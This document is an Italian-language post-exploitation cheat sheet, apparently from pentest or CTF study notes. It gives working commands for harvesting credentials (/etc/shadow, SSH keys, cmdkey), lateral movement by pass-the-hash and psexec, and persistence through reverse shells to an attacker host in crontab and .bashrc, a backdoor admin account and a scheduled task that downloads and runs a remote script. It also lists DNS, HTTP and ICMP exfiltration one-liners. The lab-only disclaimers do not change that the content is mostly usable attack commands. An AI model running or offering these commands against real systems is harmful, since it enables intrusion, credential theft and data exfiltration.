# 🎯 Post Exploitation

Appunti e snippet per la fase di **post-sfruttamento**.
Obiettivo: consolidare l’accesso, raccogliere prove, muoversi lateralmente e simulare l’esfiltrazione dati (solo in ambienti di test o CTF).

---

## 📌 Obiettivi

* Raccogliere **evidenze** utili (utenti, credenziali, file sensibili, network info).
* Stabilire **persistence** per non perdere l’accesso.
* Effettuare **lateral movement** (solo lab controllati).
* Simulare **data exfiltration** per valutare la sicurezza (solo test/CTF).

---

## 🗂️ Evidence Gathering

**Perché farlo:**
Consolidare le informazioni ottenute dall’accesso, senza generare rumore inutile.

### 🔹 Linux

```bash
# Info base sull’utente
whoami
id
groups

# Ultimi login
last -a
lastlog

# Utenti del sistema
cat /etc/passwd
awk -F: '($3 == "0") {print}' /etc/passwd   # utenti con UID 0

# Credenziali shadow (se leggibile → da crackare in lab)
cat /etc/shadow

# Processi attivi
ps aux
top -bn1

# Porte e connessioni di rete
ss -tunlp
netstat -anp

# Config di rete
ip a
ip route

# Cronjob
cat /etc/crontab
ls -lah /etc/cron.*

# Config & history (potenziali credenziali)
cat ~/.bash_history
cat ~/.ssh/known_hosts
cat ~/.ssh/id_rsa
```

### 🔹 Windows

```powershell
# Utente attuale e privilegi
whoami
whoami /priv
echo %username%

# Lista utenti locali
net user
net localgroup administrators

# Processi e servizi
tasklist /v
sc query type= service state= all

# Informazioni di rete
ipconfig /all
netstat -ano

# Credenziali salvate
cmdkey /list   # credenziali memorizzate
```

### 🔹 Tool utili

* **LinPEAS / WinPEAS** → raccolta automatica di info utili per priv esc & post-exploitation
* **Seatbelt (Windows)** → enumerazione avanzata (privilegi, chiavi di registro, credenziali, AV)
* **SharpUp (Windows)** → escalation checks rapidi
* **BloodHound/SharpHound** → mappatura Active Directory

---

## 🔄 Lateral Movement (solo lab/test)

**Perché farlo:**
Simulare lo spostamento laterale in una rete compromessa.
⚠️ Da fare solo in lab/CTF, **mai in ambienti reali**.

### 🔹 Linux

```bash
# Uso credenziali trovate
ssh user@<target-ip>

# Connessione con chiave privata rubata
ssh -i id_rsa user@<target-ip>

# Passaggio file con scp
scp secret.txt user@<target-ip>:/tmp/
```

### 🔹 Windows / Active Directory

```powershell
# Pass-the-Hash (Impacket)
pth-winexe -U 'DOMAIN/user%aad3b435b51404eeaad3b435b51404ee:HASH' //<target-ip> cmd

# WMI Exec (Impacket)
wmiexec.py DOMAIN/user:Password@<target-ip>

# PsExec (Sysinternals / Impacket)
psexec.py DOMAIN/user:Password@<target-ip>
```

**Tool utili:**

* **Impacket suite** → `psexec.py`, `wmiexec.py`, `smbexec.py`, `dcomexec.py`
* **CrackMapExec** → enumerate, lateral move, spray, pass-the-hash
* **Mimikatz** → estrazione credenziali in memoria + pass-the-ticket

---

## ♻️ Persistence

**Perché farlo:**
Mantenere accesso anche dopo reboot o logout (solo in test/lab).

### 🔹 Linux

```bash
# Backdoor SSH (aggiunta chiave)
echo 'ssh-rsa AAAAB3... attacker@lab' >> ~/.ssh/authorized_keys

# Reverse shell via cronjob
echo "* * * * * /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1" >> /etc/crontab

# Alias persistente
echo "alias ls='ls -la --color=auto; /bin/bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'" >> ~/.bashrc
```

### 🔹 Windows

```powershell
# Nuovo utente admin
net user backdoor Passw0rd! /add
net localgroup administrators backdoor /add

# Scheduled task per reverse shell
schtasks /create /sc minute /mo 5 /tn "Updater" /tr "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/rev.ps1')"

# Run key persistence
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\backdoor.exe"
```

**Tool utili:**

* **Metasploit persistence module**
* **Empire / Covenant** → persistence & C2 frameworks

---

## 📤 Data Exfiltration (solo lab/test)

**Perché farlo:**
Simulare l’uscita di dati sensibili.
⚠️ Da eseguire **solo in ambienti controllati**.

### 🔹 Linux

```bash
# Trasferimento via scp
scp /etc/passwd attacker@<ip>:/tmp/

# File encode per aggirare controlli
cat secret.txt | base64 > secret.b64
```

### 🔹 Windows

```powershell
# Encode file con certutil
certutil -encode secret.txt secret.b64

# Trasferimento con SMB (impacket-smbserver)
impacket-smbserver share /tmp/
copy secret.txt \\<attacker-ip>\share
```

### 🔹 Canali alternativi (lab)

* **HTTP exfiltration** → `curl -X POST -d @file http://<attacker-ip>/upload`
* **DNS exfiltration** → `nslookup $(cat secret.txt).attacker.com`
* **ICMP exfiltration** → `ping -c 1 "$(cat secret.txt)"@attacker.com`

**Tool utili:**

* **exfiltrator**, **dnsExfiltrator**, **iodine** (DNS tunneling), **plink** (tunnel TCP → SSH)

---

## 📚 Risorse utili

* [PayloadsAllTheThings – Post Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Post-Exploitation)
* [HackTricks – Post Exploitation](https://book.hacktricks.xyz/windows-hardening/post-exploitation)
* [LOLBAS](https://lolbas-project.github.io/) – Living Off The Land Binaries and Scripts (Windows)
* [GTFOBins](https://gtfobins.github.io/) – Escalation & persistence su Linux binaries
* [BloodHound](https://github.com/BloodHoundAD/BloodHound) – Active Directory attack path mapping

---
